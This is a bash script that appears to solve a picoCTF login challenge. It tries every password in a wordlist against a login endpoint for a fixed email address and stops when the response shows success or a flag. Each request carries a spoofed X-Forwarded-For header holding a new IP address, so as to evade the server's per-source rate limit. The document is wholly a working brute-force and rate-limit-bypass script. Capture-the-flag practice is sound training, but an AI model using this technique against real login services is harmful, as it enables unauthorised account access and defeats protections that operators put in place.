#!/bin/bash
URL="http://amiable-citadel.picoctf.net:63672/login"
i=0
while IFS= read -r pw; do
  i=$((i+1))
  # Use a unique IP per attempt to bypass the per-source rate limit
  ip="10.$((i/65536 % 256)).$((i/256 % 256)).$((i % 256))"
  resp=$(curl -sS -X POST "$URL" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $ip" \
    -d "{\"email\":\"ctf-player@picoctf.org\",\"password\":\"$pw\"}")
  echo "[$i] $pw -> $resp"
  if echo "$resp" | grep -q '"success":true\|"flag"'; then
    echo "FOUND: $resp"
    break
  fi
done < passwords.txt
